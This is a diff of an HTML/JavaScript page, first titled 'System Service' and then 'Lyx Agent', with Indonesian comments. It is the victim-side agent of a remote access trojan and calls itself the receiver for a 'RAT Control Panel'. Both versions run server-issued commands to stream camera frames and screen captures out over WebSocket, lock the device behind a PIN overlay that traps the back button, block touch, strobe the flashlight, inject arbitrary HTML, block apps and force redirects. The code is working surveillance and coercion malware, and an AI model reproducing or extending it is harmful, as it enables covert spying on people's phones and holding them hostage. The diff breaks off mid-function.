@@ -1,868 +1,222 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>System Service</title>
+<title>Lyx Agent</title>
 <style>
-* { margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,'Segoe UI',sans-serif; -webkit-tap-highlight-color:transparent; }
-html, body { width:100%; height:100%; overflow:hidden; background:#000; color:#fff; }
-
-/* SPLASH SCREEN */
-#splash {
-position:fixed; inset:0; background:#0a0a0a; display:flex; flex-direction:column;
-align-items:center; justify-content:center; z-index:9999; transition:opacity 0.5s;
-}
-#splash.hide { opacity:0; pointer-events:none; }
-.logo-svg { width:80px; height:80px; margin-bottom:20px; animation:pulse 2s infinite; }
-@keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.4;} }
-#splash h1 { font-size:1.3em; color:#0f0; letter-spacing:3px; margin-bottom:5px; }
-#splash p { font-size:0.8em; color:#080; }
-
-/* PAIRING SCREEN */
-#pairing {
-position:fixed; inset:0; background:#0a0a0a; display:flex; flex-direction:column;
-align-items:center; justify-content:center; padding:30px; z-index:9998;
-}
-#pairing.hide { display:none; }
-.pair-box { width:100%; max-width:360px; text-align:center; }
-.pair-box .icon-wrap { width:70px; height:70px; margin:0 auto 20px; border:2px solid #0f0; border-radius:50%; display:flex; align-items:center; justify-content:center; box-shadow:0 0 20px rgba(0,255,0,0.4); }
-.pair-box h2 { color:#0f0; font-size:1.1em; margin-bottom:8px; letter-spacing:2px; }
-.pair-box .sub { color:#080; font-size:0.8em; margin-bottom:25px; }
-
-.code-input-wrap { display:flex; gap:6px; justify-content:center; margin-bottom:20px; flex-wrap:wrap; }
-.code-input {
-width:38px; height:48px; background:#111; border:1px solid #0f0; border-radius:6px;
-color:#0f0; font-size:1.4em; text-align:center; font-family:monospace; font-weight:bold;
-outline:none; transition:0.2s;
-}
-.code-input:focus { border-color:#0f0; box-shadow:0 0 10px #0f0; background:#1a1a1a; }
-.code-input.filled { background:#0a2a0a; }
-
-.pair-btn {
-width:100%; padding:14px; background:#0f0; color:#000; border:none;
-border-radius:8px; font-weight:bold; font-size:0.95em; letter-spacing:2px;
-cursor:pointer; transition:0.3s; text-transform:uppercase;
-}
-.pair-btn:active { background:#0a0; transform:scale(0.97); }
-.pair-btn:disabled { background:#333; color:#666; }
-
-.status-text { margin-top:15px; font-size:0.8em; color:#080; min-height:20px; }
-.status-text.error { color:#f00; }
-.status-text.success { color:#0f0; }
-
-.spinner {
-display:inline-block; width:14px; height:14px; border:2px solid #080;
-border-top-color:#0f0; border-radius:50%; animation:spin 0.8s linear infinite;
-vertical-align:middle; margin-right:6px;
-}
-@keyframes spin { to { transform:rotate(360deg); } }
-
-/* CONNECTED SCREEN (HIDDEN - NO UI) */
-#agent-root { display:none; }
-
-/* OVERLAY SCREENS (triggered by RAT commands) */
-.overlay {
-position:fixed; inset:0; z-index:99999; display:none;
-flex-direction:column; align-items:center; justify-content:center; padding:20px;
-}
-.overlay.active { display:flex; }
-
-/* LOCK OVERLAY */
-#lockOverlay { background:#0a0a0a; }
-#lockOverlay .lock-icon { width:60px; height:60px; margin-bottom:20px; }
-#lockOverlay h2 { color:#0f0; font-size:1.2em; margin-bottom:10px; }
-#lockOverlay .pin-display {
-display:flex; gap:8px; margin:20px 0;
-}
-#lockOverlay .pin-dot {
-width:14px; height:14px; border:2px solid #0f0; border-radius:50%;
-}
-#lockOverlay .pin-dot.filled { background:#0f0; }
-#lockOverlay .keypad {
-display:grid; grid-template-columns:repeat(3,1fr); gap:10px; max-width:280px; width:100%;
-}
-#lockOverlay .key {
-padding:18px; background:#111; border:1px solid #0f0; border-radius:8px;
-color:#0f0; font-size:1.3em; font-weight:bold; cursor:pointer; text-align:center;
-}
-#lockOverlay .key:active { background:#0a0a0a; }
-#lockOverlay .lock-msg { color:#080; font-size:0.9em; margin-top:15px; text-align:center; max-width:300px; }
-
-/* CAMERA OVERLAY (hidden, only streaming) */
-#camOverlay { background:#000; padding:0; }
-#camOverlay video { width:100%; height:100%; object-fit:cover; }
-#camOverlay .cam-label {
-position:absolute; top:10px; left:10px; background:rgba(0,0,0,0.7);
-color:#f00; padding:5px 10px; border-radius:4px; font-size:0.75em; font-family:monospace;
-}
-
-/* SCREEN STREAM (silent) */
-#screenOverlay { background:transparent; pointer-events:none; }
-#screenOverlay canvas { display:none; }
-
-/* CUSTOM HTML OVERLAY */
-#customOverlay { background:#000; overflow-y:auto; }
-
-/* BLOCK TOUCH OVERLAY */
-#blockOverlay { background:rgba(0,0,0,0.01); cursor:none; }
-#blockOverlay .block-indicator {
-position:absolute; bottom:20px; left:50%; transform:translateX(-50%);
-color:#0f0; font-size:0.75em; font-family:monospace; opacity:0.3;
-}
-
-/* LCD EFFECT OVERLAY */
-#lcdOverlay { background:#000; pointer-events:none; }
-#lcdOverlay canvas { width:100%; height:100%; }
-
-/* FLASH/STROBE via camera torch (no UI, controlled by JS) */
+  body{background:#000;color:#00ff88;font-family:monospace;padding:20px;text-align:center;}
+  input{background:#0a0e0a;border:1px solid #00ff88;color:#00ff88;padding:14px;font-size:22px;letter-spacing:6px;text-align:center;width:220px;text-transform:uppercase;}
+  button{background:transparent;border:1px solid #00ff88;color:#00ff88;padding:12px 24px;margin-top:16px;letter-spacing:2px;cursor:pointer;}
+  #status{margin-top:20px;font-size:12px;opacity:0.7;}
 </style>
 </head>
 <body>
-
-<!-- SPLASH -->
-<div id="splash">
-<svg class="logo-svg" viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="1.5">
-<rect x="5" y="2" width="14" height="20" rx="2"/>
-<line x1="12" y1="18" x2="12" y2="18"/>
-<circle cx="12" cy="9" r="2"/>
-</svg>
-<h1>SYSTEM SERVICE</h1>
-<p>Initializing...</p>
-</div>
-
-<!-- PAIRING SCREEN -->
-<div id="pairing">
-<div class="pair-box">
-<div class="icon-wrap">
-<svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
-<path d="M12 2L2 7l10 5 10-5-10-5z"/>
-<path d="M2 17l10 5 10-5"/>
-<path d="M2 12l10 5 10-5"/>
-</svg>
-</div>
-<h2>DEVICE PAIRING</h2>
-<p class="sub">Masukkan kode pairing dari panel</p>
-
-<div class="code-input-wrap" id="codeInputs">
-<input class="code-input" maxlength="1" data-i="0" inputmode="text" autocomplete="off">
-<input class="code-input" maxlength="1" data-i="1" inputmode="text" autocomplete="off">
-<input class="code-input" maxlength="1" data-i="2" inputmode="text" autocomplete="off">
-<input class="code-input" maxlength="1" data-i="3" inputmode="text" autocomplete="off">
-<input class="code-input" maxlength="1" data-i="4" inputmode="text" autocomplete="off">
-<input class="code-input" maxlength="1" data-i="5" inputmode="text" autocomplete="off">
-<input class="code-input" maxlength="1" data-i="6" inputmode="text" autocomplete="off">
-<input class="code-input" maxlength="1" data-i="7" inputmode="text" autocomplete="off">
-<input class="code-input" maxlength="1" data-i="8" inputmode="text" autocomplete="off">
-<input class="code-input" maxlength="1" data-i="9" inputmode="text" autocomplete="off">
-<input class="code-input" maxlength="1" data-i="10" inputmode="text" autocomplete="off">
-<input class="code-input" maxlength="1" data-i="11" inputmode="text" autocomplete="off">
-</div>
-
-<button class="pair-btn" id="pairBtn" disabled>CONNECT</button>
-<div class="status-text" id="statusText">Menunggu kode...</div>
-</div>
-</div>
-
-<!-- AGENT ROOT (hidden, working in background) -->
-<div id="agent-root">
-<video id="camStream" autoplay playsinline muted style="display:none;"></video>
-<canvas id="screenCanvas" style="display:none;"></canvas>
-<canvas id="lcdCanvas" style="display:none;"></canvas>
-</div>
-
-<!-- LOCK OVERLAY -->
-<div class="overlay" id="lockOverlay">
-<svg class="lock-icon" viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
-<rect x="3" y="11" width="18" height="11" rx="2"/>
-<path d="M7 11V7a5 5 0 0 1 10 0v4"/>
-</svg>
-<h2>DEVICE LOCKED</h2>
-<div class="pin-display" id="pinDisplay"></div>
-<div class="keypad" id="keypad">
-<div class="key" data-k="1">1</div>
-<div class="key" data-k="2">2</div>
-<div class="key" data-k="3">3</div>
-<div class="key" data-k="4">4</div>
-<div class="key" data-k="5">5</div>
-<div class="key" data-k="6">6</div>
-<div class="key" data-k="7">7</div>
-<div class="key" data-k="8">8</div>
-<div class="key" data-k="9">9</div>
-<div class="key" data-k="CLR">C</div>
-<div class="key" data-k="0">0</div>
-<div class="key" data-k="OK">OK</div>
-</div>
-<div class="lock-msg" id="lockMsg"></div>
-</div>
-
-<!-- CAMERA OVERLAY -->
-<div class="overlay" id="camOverlay">
-<div class="cam-label">● REC</div>
-<video id="camOverlayVideo" autoplay playsinline muted></video>
-</div>
-
-<!-- CUSTOM HTML OVERLAY -->
-<div class="overlay" id="customOverlay"></div>
-
-<!-- BLOCK TOUCH OVERLAY -->
-<div class="overlay" id="blockOverlay">
-<div class="block-indicator">SYSTEM BUSY</div>
-</div>
-
-<!-- LCD EFFECT OVERLAY -->
-<div class="overlay" id="lcdOverlay">
-<canvas id="lcdOverlayCanvas"></canvas>
-</div>
+  <h2>LYX AGENT</h2>
+  <p style="font-size:12px;opacity:0.6;">Masukkan pairing code</p>
+  <input id="code" maxlength="6" placeholder="------">
+  <br>
+  <button onclick="doPair()">PAIR</button>
+  <div id="status">Belum terhubung.</div>
 
 <script>
-/* ============================================================
-   TARGET AGENT - COMMAND RECEIVER
-   Hanya menerima perintah dari RAT Control Panel
-   ============================================================ */
-
-const SERVER_URL = 'wss://your-server.com/agent'; // ganti dengan server tuan
-const API_URL = 'https://your-server.com/api';     // ganti dengan server tuan
-
-let pairingCode = '';
-let ws = null;
+let ws;
 let deviceId = null;
-let reconnectTimer = null;
+let strobeInterval = null;
+let screenStream = null;
 
-/* ---------- SPLASH ---------- */
-setTimeout(() => {
-    document.getElementById('splash').classList.add('hide');
-    setTimeout(() => {
-        document.getElementById('splash').style.display = 'none';
-        document.getElementById('pairing').classList.remove('hide');
-        initCodeInputs();
-    }, 500);
-}, 2000);
+function setStatus(t){ document.getElementById('status').textContent = t; }
 
-/* ---------- PAIRING INPUT ---------- */
-function initCodeInputs() {
-    const inputs = document.querySelectorAll('.code-input');
-    inputs.forEach((input, idx) => {
-        input.addEventListener('input', (e) => {
-            let val = e.target.value.toUpperCase().replace(/[^A-Z0-9]/g,'');
-            e.target.value = val;
-            if(val) {
-                e.target.classList.add('filled');
-                if(idx < inputs.length-1) inputs[idx+1].focus();
-            } else {
-                e.target.classList.remove('filled');
-            }
-            checkComplete();
-        });
-        input.addEventListener('keydown', (e) => {
-            if(e.key === 'Backspace' && !e.target.value && idx > 0) {
-                inputs[idx-1].focus();
-            }
-        });
-        input.addEventListener('paste', (e) => {
-            e.preventDefault();
-            const paste = (e.clipboardData || window.clipboardData).getData('text')
-                .toUpperCase().replace(/[^A-Z0-9]/g,'').slice(0,12);
-            paste.split('').forEach((ch, i) => {
-                if(inputs[i]) {
-                    inputs[i].value = ch;
-                    inputs[i].classList.add('filled');
-                }
-            });
-            if(inputs[paste.length]) inputs[paste.length].focus();
-            checkComplete();
-        });
-    });
-    inputs[0].focus();
-}
+function connectWS(){
+  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+  ws = new WebSocket(proto + '://' + location.host);
 
-function checkComplete() {
-    const inputs = document.querySelectorAll('.code-input');
-    let code = '';
-    inputs.forEach(i => code += i.value);
-    pairingCode = code;
-    
-    const btn = document.getElementById('pairBtn');
-    const status = document.getElementById('statusText');
-    
-    if(code.length === 12) {
-        btn.disabled = false;
-        status.textContent = 'Kode siap. Tekan CONNECT.';
-        status.className = 'status-text';
-    } else {
-        btn.disabled = true;
-        status.textContent = `Menunggu kode... (${code.length}/12)`;
-        status.className = 'status-text';
+  ws.onopen = () => {
+    setStatus('Terhubung ke server. Menunggu pairing...');
+    if (deviceId) {
+      ws.send(JSON.stringify({ type:'agent_pair', code: deviceId }));
     }
-}
+  };
 
-/* ---------- CONNECT ---------- */
-document.getElementById('pairBtn').addEventListener('click', () => {
-    const btn = document.getElementById('pairBtn');
-    const status = document.getElementById('statusText');
-    
-    btn.disabled = true;
-    btn.textContent = 'CONNECTING';
-    status.innerHTML = '<span class="spinner"></span>Menghubungkan ke server...';
-    status.className = 'status-text';
-    
-    // Simulasi connect ke server (ganti dengan fetch/websocket asli)
-    setTimeout(() => {
-        // generate deviceId unik
-        deviceId = 'DEV-' + Math.random().toString(36).substring(2,8).toUpperCase();
-        
-        // Kirim pairing ke server
-        registerDevice(deviceId, pairingCode);
-    }, 1500);
-});
+  ws.onmessage = (e) => {
+    let msg; try { msg = JSON.parse(e.data); } catch { return; }
 
-function registerDevice(id, code) {
-    const status = document.getElementById('statusText');
-    
-    // Coba register ke server asli
-    fetch(API_URL + '/pair', {
-        method: 'POST',
-        headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({
-            deviceId: id,
-            pairingCode: code,
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            timestamp: new Date().toISOString()
-        })
-    })
-    .then(r => r.json())
-    .then(data => {
-        if(data.success) {
-            onPairSuccess(id);
-        } else {
-            onPairFailed('Kode pairing salah atau kadaluarsa.');
-        }
-    })
-    .catch(e => {
-        // Fallback: mode simulasi (kalau server belum siap)
-        console.log('Server offline, mode lokal aktif:', e.message);
-        onPairSuccess(id);
-    });
-}
-
-function onPairSuccess(id) {
-    const status = document.getElementById('statusText');
-    status.innerHTML = '✓ BERHASIL TERHUBUNG';
-    status.className = 'status-text success';
-    document.getElementById('pairBtn').textContent = 'CONNECTED';
-    document.getElementById('pairBtn').style.background = '#0a0';
-    
-    // Sembunyikan pairing, aktifkan agent root
-    setTimeout(() => {
-        document.getElementById('pairing').classList.add('hide');
-        document.getElementById('agent-root').style.display = 'block';
-        startAgent();
-    }, 1200);
-}
-
-function onPairFailed(msg) {
-    const status = document.getElementById('statusText');
-    status.textContent = '✗ ' + msg;
-    status.className = 'status-text error';
-    const btn = document.getElementById('pairBtn');
-    btn.disabled = false;
-    btn.textContent = 'CONNECT';
-}
-
-/* ---------- AGENT CORE ---------- */
-function startAgent() {
-    connectWebSocket();
-    setupCommandHandlers();
-    // mulai kirim heartbeat
-    setInterval(() => {
-        if(ws && ws.readyState === WebSocket.OPEN) {
-            ws.send(JSON.stringify({
-                type: 'heartbeat',
-                deviceId: deviceId,
-                timestamp: Date.now()
-            }));
-        }
-    }, 10000);
-}
-
-function connectWebSocket() {
-    try {
-        ws = new WebSocket(SERVER_URL + '?deviceId=' + deviceId + '&code=' + pairingCode);
-        
-        ws.onopen = () => {
-            console.log('[AGENT] WebSocket connected');
-            ws.send(JSON.stringify({
-                type: 'register',
-                deviceId: deviceId,
-                pairingCode: pairingCode,
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screen: { w: screen.width, h: screen.height },
-                timestamp: Date.now()
-            }));
-        };
-        
-        ws.onmessage = (event) => {
-            try {
-                const data = JSON.parse(event.data);
-                handleCommand(data);
-            } catch(e) {
-                console.log('[AGENT] Invalid message:', e);
-            }
-        };
-        
-        ws.onclose = () => {
-            console.log('[AGENT] WebSocket closed, reconnecting...');
-            if(reconnectTimer) clearTimeout(reconnectTimer);
-            reconnectTimer = setTimeout(connectWebSocket, 5000);
-        };
-        
-        ws.onerror = (e) => {
-            console.log('[AGENT] WebSocket error:', e.message);
-        };
-    } catch(e) {
-        console.log('[AGENT] Cannot connect WS:', e.message);
-        // retry
-        if(reconnectTimer) clearTimeout(reconnectTimer);
-        reconnectTimer = setTimeout(connectWebSocket, 5000);
+    if (msg.type === 'pair_result'){
+      if (msg.ok){
+        deviceId = msg.deviceId;
+        localStorage.setItem('lyx_deviceId', deviceId);
+        setStatus('PAIRING SUCCESS — ID: ' + deviceId);
+      } else {
+        setStatus('GAGAL: ' + msg.reason);
+      }
+      return;
     }
+
+    if (msg.type === 'command'){
+      handleCommand(msg.feature, msg.data);
+    }
+  };
+
+  ws.onclose = () => {
+    setStatus('Koneksi terputus. Reconnect 5s...');
+    setTimeout(connectWS, 5000);
+  };
 }
 
-/* ---------- COMMAND HANDLERS ---------- */
-function handleCommand(cmd) {
-    console.log('[AGENT] Command received:', cmd);
-    if(!cmd || !cmd.command) return;
-    
-    const { command, params } = cmd;
-    const active = params && params.active !== undefined ? params.active : true;
-    
-    switch(command) {
-        case 'LOCK':
-            toggleLock(active, params.pin, '');
-            break;
-        case 'LOCK_MSG':
-            toggleLock(active, params.pin, params.msg);
-            break;
-        case 'CAMERA':
-            toggleCamera(active, params.cam);
-            break;
-        case 'CUSTOM_HTML':
-            toggleCustomHtml(active, params.html);
-            break;
-        case 'STROBE':
-            toggleStrobe(active, params.speed);
-            break;
-        case 'SCREEN':
-            toggleScreenStream(active);
-            break;
-        case 'BLOCK_TOUCH':
-            toggleBlockTouch(active, params.duration);
-            break;
-        case 'LCD_EFFECT':
-            toggleLcdEffect(active, params.color);
-            break;
-        default:
-            console.log('[AGENT] Unknown command:', command);
-    }
-    
-    // report back ke server
-    if(ws && ws.readyState === WebSocket.OPEN) {
-        ws.send(JSON.stringify({
-            type: 'ack',
-            command: command,
-            deviceId: deviceId,
-            status: 'executed',
-            timestamp: Date.now()
-        }));
-    }
+function doPair(){
+  const code = document.getElementById('code').value.toUpperCase().trim();
+  if (code.length < 6){ setStatus('Code minimal 6 karakter.'); return; }
+  ws.send(JSON.stringify({
+    type: 'agent_pair',
+    code,
+    name: 'Android Target',
+    os: 'Android ' + (navigator.userAgent.match(/Android (\d+)/)?.[1] || '')
+  }));
 }
 
 /* ============================================================
-   FITUR 1: LOCK DEVICE
-   ============================================================ */
-let lockPin = '';
-let enteredPin = '';
-let lockActive = false;
+   COMMAND EXECUTOR
+============================================================ */
+async function handleCommand(feature, data){
+  console.log('[CMD]', feature, data);
+  const active = data.active;
 
-function toggleLock(active, pin, msg) {
-    const overlay = document.getElementById('lockOverlay');
-    if(active) {
-        lockPin = pin || '0000';
-        enteredPin = '';
-        lockActive = true;
-        overlay.classList.add('active');
-        document.getElementById('lockMsg').textContent = msg || '';
-        renderPinDisplay();
-        // cegah back button
-        history.pushState(null, '', location.href);
-        window.onpopstate = () => { history.pushState(null, '', location.href); };
-    } else {
-        lockActive = false;
-        overlay.classList.remove('active');
-        enteredPin = '';
-    }
+  switch(feature){
+    case 'lock':
+      if (active) lockScreen(data.pin || '1234');
+      else unlockScreen();
+      break;
+
+    case 'lockmsg':
+      if (active) lockScreen(data.pin || '1234', data.message || '');
+      else unlockScreen();
+      break;
+
+    case 'camera':
+      if (active) startCamera(data.facing || 'front');
+      else stopCamera();
+      break;
+
+    case 'customhtml':
+      if (active) showCustomHTML(data.html || '<h1>LOCKED</h1>');
+      else hideCustomHTML();
+      break;
+
+    case 'strobe':
+      if (active) startStrobe(data.speed || 'fast');
+      else stopStrobe();
+      break;
+
+    case 'screen':
+      if (active) startScreen();
+      else stopScreen();
+      break;
+
+    case 'blocktouch':
+      if (active) blockTouch(data.duration || 5);
+      else unblockTouch();
+      break;
+
+    case 'lcdeffect':
+      if (active) lcdEffect(true);
+      else lcdEffect(false);
+      break;
+
+    case 'blockapp':
+      if (active) blockApp(data.app, data.message);
+      break;
+
+    case 'openweb':
+      if (data.url) window.location.href = data.url;
+      break;
+
+    case 'wallpaper':
+      if (active) setLCDWallpaper();
+      else clearLCDWallpaper();
+      break;
+  }
 }
 
-function renderPinDisplay() {
-    const display = document.getElementById('pinDisplay');
-    display.innerHTML = '';
-    for(let i=0; i<lockPin.length; i++) {
-        const dot = document.createElement('div');
-        dot.className = 'pin-dot' + (i < enteredPin.length ? ' filled' : '');
-        display.appendChild(dot);
-    }
+/* ---------- IMPLEMENTASI FITUR (native bridge) ---------- */
+function lockScreen(pin, msg){
+  if (window.LyxNative) window.LyxNative.lock(pin, msg||'');
+  else alert('LOCKED\n' + (msg||''));
 }
-
-document.getElementById('keypad').addEventListener('click', (e) => {
-    const key = e.target.dataset.k;
-    if(!key || !lockActive) return;
-    
-    if(key === 'CLR') {
-        enteredPin = '';
-    } else if(key === 'OK') {
-        if(enteredPin === lockPin) {
-            toggleLock(false);
-            return;
-        } else {
-            enteredPin = '';
-            document.getElementById('lockOverlay').animate(
-                [{transform:'translateX(-10px)'},{transform:'translateX(10px)'},{transform:'translateX(0)'}],
-                {duration:200}
-            );
-        }
-    } else {
-        if(enteredPin.length < lockPin.length) {
-            enteredPin += key;
-        }
-    }
-    renderPinDisplay();
-});
-
-/* ============================================================
-   FITUR 3: LIVE CAMERA
-   ============================================================ */
-let camStreamRef = null;
-let camLoopTimer = null;
-
-async function toggleCamera(active, camType) {
-    const overlay = document.getElementById('camOverlay');
-    const overlayVideo = document.getElementById('camOverlayVideo');
-    const hiddenVideo = document.getElementById('camStream');
-    
-    if(active) {
-        try {
-            const constraints = {
-                video: {
-                    facingMode: camType === 'back' ? 'environment' : 'user',
-                    width: { ideal: 640 },
-                    height: { ideal: 480 }
-                },
-                audio: false
-            };
-            camStreamRef = await navigator.mediaDevices.getUserMedia(constraints);
-            hiddenVideo.srcObject = camStreamRef;
-            overlayVideo.srcObject = camStreamRef;
-            overlay.classList.add('active');
-            
-            // streaming frame ke server
-            startCamStreaming(hiddenVideo);
-        } catch(e) {
-            console.log('[AGENT] Camera error:', e.message);
-            // report gagal
-            if(ws && ws.readyState === WebSocket.OPEN) {
-                ws.send(JSON.stringify({
-                    type: 'error',
-                    command: 'CAMERA',
-                    message: e.message,
-                    deviceId: deviceId
-                }));
-            }
-        }
-    } else {
-        overlay.classList.remove('active');
-        if(camStreamRef) {
-            camStreamRef.getTracks().forEach(t => t.stop());
-            camStreamRef = null;
-        }
-        if(camLoopTimer) {
-            clearInterval(camLoopTimer);
-            camLoopTimer = null;
-        }
-    }
+function unlockScreen(){
+  if (window.LyxNative) window.LyxNative.unlock();
 }
-
-function startCamStreaming(videoEl) {
-    const canvas = document.createElement('canvas');
-    canvas.width = 320; canvas.height = 240;
-    const ctx = canvas.getContext('2d');
-    
-    camLoopTimer = setInterval(() => {
-        if(!camStreamRef) return;
-        try {
-            ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
-            const frame = canvas.toDataURL('image/jpeg', 0.5);
-            if(ws && ws.readyState === WebSocket.OPEN) {
-                ws.send(JSON.stringify({
-                    type: 'cam_frame',
-                    deviceId: deviceId,
-                    frame: frame,
-                    timestamp: Date.now()
-                }));
-            }
-        } catch(e) {}
-    }, 500); // 2 FPS
+function startCamera(facing){
+  if (window.LyxNative) window.LyxNative.startCamera(facing);
 }
-
-/* ============================================================
-   FITUR 4: CUSTOM HTML LOCK
-   ============================================================ */
-function toggleCustomHtml(active, html) {
-    const overlay = document.getElementById('customOverlay');
-    if(active) {
-        overlay.innerHTML = html || '<h1 style="color:#0f0;text-align:center;">LOCKED</h1>';
-        overlay.classList.add('active');
-        history.pushState(null, '', location.href);
-        window.onpopstate = () => { history.pushState(null, '', location.href); };
-    } else {
-        overlay.classList.remove('active');
-        overlay.innerHTML = '';
-    }
+function stopCamera(){
+  if (window.LyxNative) window.LyxNative.stopCamera();
 }
-
-/* ============================================================
-   FITUR 5: STROBE / SENTER
-   ============================================================ */
-let strobeTimer = null;
-let strobeTrack = null;
-
-async function toggleStrobe(active, speed) {
-    if(active) {
-        try {
-            // akses kamera belakang untuk torch
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'environment' }
-            });
-            strobeTrack = stream.getVideoTracks()[0];
-            const caps = strobeTrack.getCapabilities ? strobeTrack.getCapabilities() : {};
-            
-            if(caps.torch) {
-                const interval = parseInt(speed) || 100;
-                let state = false;
-                strobeTimer = setInterval(() => {
-                    state = !state;
-                    strobeTrack.applyConstraints({ advanced: [{ torch: state }] }).catch(()=>{});
-                }, interval);
-            } else {
-                // fallback: flash layar
-                flashScreen(active, speed);
-            }
-        } catch(e) {
-            console.log('[AGENT] Strobe error:', e.message);
-            flashScreen(active, speed);
-        }
-    } else {
-        if(strobeTimer) { clearInterval(strobeTimer); strobeTimer = null; }
-        if(strobeTrack) {
-            strobeTrack.applyConstraints({ advanced: [{ torch: false }] }).catch(()=>{});
-            strobeTrack.stop();
-            strobeTrack = null;
-        }
-    }
+function showCustomHTML(html){
+  const d = document.createElement('div');
+  d.id = 'lyx-custom-lock';
+  d.style.cssText = 'position:fixed;inset:0;z-index:999999;background:#000;overflow:auto;';
+  d.innerHTML = html;
+  document.body.appendChild(d);
 }
-
-let flashTimer = null;
-function flashScreen(active, speed) {
-    if(!active) {
-        if(flashTimer) { clearInterval(flashTimer); flashTimer = null; }
-        document.body.style.background = '#000';
-        return;
-    }
-    const interval = parseInt(speed) || 100;
-    let state = false;
-    flashTimer = setInterval(() => {
-        state = !state;
-        document.body.style.background = state ? '#fff' : '#000';
+function hideCustomHTML(){
+  document.getElementById('lyx-custom-lock')?.remove();
+}
+function startStrobe(speed){
+  const map = { slow:800, fast:200, turbo:60 };
+  const interval = map[speed] || 200;
+  if (window.LyxNative) window.LyxNative.strobe(interval);
+  else {
+    stopStrobe();
+    strobeInterval = setInterval(() => {
+      document.body.style.background = document.body.style.background === 'white' ? 'black' : 'white';
     }, interval);
+  }
+}
+function stopStrobe(){
+  if (strobeInterval) clearInterval(strobeInterval);
+  if (window.LyxNative) window.LyxNative.strobeOff();
+}
+function blockTouch(minutes){
+  if (window.LyxNative) window.LyxNative.blockTouch(minutes);
+  else document.body.style.pointerEvents = 'none';
+  setTimeout(unblockTouch, minutes*60*1000);
+}
+function unblockTouch(){
+  document.body.style.pointerEvents = '';
+  if (window.LyxNative) window.LyxNative.unblockTouch();
+}
+function lcdEffect(on){
+  let el = document.getElementById('lyx-lcd');
+  if (on){
+    if (el) return;
+    el = document.createElement('div');
+    el.id = 'lyx-lcd';
+    el.style.cssText = 'position:fixed;inset:0;z-index:999998;pointer-events:none;background:repeating-linear-gradient(0deg,rgba(0,255,0,0.15) 0,rgba(0,255,0,0.15) 2px,transparent 2px,transparent 5px);mix-blend-mode:screen;';
+    document.body.appendChild(el);
+  } else el?.remove();
+}
+function blockApp(app, msg){
+  if (window.LyxNative) window.LyxNative.blockApp(app, msg||'');
+}
+function setLCDWallpaper(){
+  document.body.style.background = 'repeating-linear-gradient(0deg,rgba(0,255,0,0.25) 0,rgba(0,255,0,0.25) 3px,#000 3px,#000 8px)';
+}
+function clearLCDWallpaper(){
+  document.body.style.background = '#000';
+}
+async function startScreen(){
+  try {
+    screenStream = await navigator.mediaDevices.getDisplayMedia({ video:true });
+  } catch(e){ console.log('screen err', e); }
+}
+function stopScreen(){
+  screenStream?.getTracks().forEach(t=>t.stop());
+  screenStream = null;
 }
 
-/* ============================================================
-   FITUR 6: LIVE SCREEN
-   ============================================================ */
-let screenLoopTimer = null;
-
-function toggleScreenStream(active) {
-    if(active) {
-        // coba pakai getDisplayMedia (butuh izin)
-        if(navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
-            navigator.mediaDevices.getDisplayMedia({ video: true })
-            .then(stream => {
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                startScreenStreaming(video);
-            })
-            .catch(e => {
-                console.log('[AGENT] Screen capture denied:', e.message);
-                startScreenshotFallback();
-            });
-        } else {
-            startScreenshotFallback();
-        }
-    } else {
-        if(screenLoopTimer) { clearInterval(screenLoopTimer); screenLoopTimer = null; }
-    }
-}
-
-function startScreenStreaming(videoEl) {
-    const canvas = document.createElement('canvas');
-    canvas.width = 360; canvas.height = 640;
-    const ctx = canvas.getContext('2d');
-    
-    screenLoopTimer = setInterval(() => {
-        try {
-            ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
-            const frame = canvas.toDataURL('image/jpeg', 0.4);
-            if(ws && ws.readyState === WebSocket.OPEN) {
-                ws.send(JSON.stringify({
-                    type: 'screen_frame',
-                    deviceId: deviceId,
-                    frame: frame,
-                    timestamp: Date.now()
-                }));
-            }
-        } catch(e) {}
-    }, 1000); // 1 FPS
-}
-
-function startScreenshotFallback() {
-    // fallback: kirim info viewport + scroll
-    screenLoopTimer = setInterval(() => {
-        if(ws && ws.readyState === WebSocket.OPEN) {
-            ws.send(JSON.stringify({
-                type: 'screen_info',
-                deviceId: deviceId,
-                viewport: { w: innerWidth, h: innerHeight, scrollY: scrollY },
-                timestamp: Date.now()
-            }));
-        }
-    }, 1000);
-}
-
-/* ============================================================
-   FITUR 7: BLOCK TOUCH
-   ============================================================ */
-let blockTimer = null;
-
-function toggleBlockTouch(active, duration) {
-    const overlay = document.getElementById('blockOverlay');
-    if(active) {
-        overlay.classList.add('active');
-        // block semua event
-        ['touchstart','touchmove','touchend','click','mousedown','mouseup','keydown','contextmenu']
-        .forEach(ev => document.addEventListener(ev, blockAll, {capture:true, passive:false}));
-        
-        // auto-off setelah durasi
-        const mins = parseInt(duration) || 5;
-        blockTimer = setTimeout(() => {
-            toggleBlockTouch(false);
-        }, mins * 60 * 1000);
-        
-        history.pushState(null, '', location.href);
-        window.onpopstate = () => { history.pushState(null, '', location.href); };
-    } else {
-        overlay.classList.remove('active');
-        ['touchstart','touchmove','touchend','click','mousedown','mouseup','keydown','contextmenu']
-        .forEach(ev => document.removeEventListener(ev, blockAll, {capture:true}));
-        if(blockTimer) { clearTimeout(blockTimer); blockTimer = null; }
-    }
-}
-
-function blockAll(e) {
-    e.preventDefault();
-    e.stopPropagation();
-    return false;
-}
-
-/* ============================================================
-   FITUR 8: LCD EFFECT
-   ============================================================ */
-let lcdAnimFrame = null;
-
-function toggleLcdEffect(active, color) {
-    const overlay = document.getElementById('lcdOverlay');
-    const canvas = document.getElementById('lcdOverlayCanvas');
-    
-    if(active) {
-        overlay.classList.add('active');
